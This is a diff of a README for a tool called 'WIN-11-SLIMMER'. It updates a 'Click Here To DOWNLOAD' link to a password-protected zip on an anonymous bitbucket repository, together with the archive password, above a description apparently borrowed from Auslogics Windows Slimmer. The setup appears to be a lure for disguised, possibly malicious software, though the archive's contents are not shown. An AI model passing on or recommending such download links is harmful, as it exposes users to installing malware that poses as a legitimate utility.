@@ -1,7 +1,7 @@
 # WIN-11-SLIMMER
 
-[Click Here To DOWNLOAD](https://bitbucket.org/112nt/a1a/downloads/Win11Slimmer_x86.zip)
-Pass: %Win11%
+[Click Here To DOWNLOAD](https://bitbucket.org/112nt/a1a/downloads/Win11_Slimmer.zip)
+Pass: %Pass%
 
 If you’re a Windows user, chances are you don’t need all the components that come with the operating system. However, there are numerous programs out there that can help you get rid of them. But what if you want even more precision over what gets deleted, like only unused language packs or obsolete Windows Update files? This is where Auslogics Windows Slimmer comes in.
 
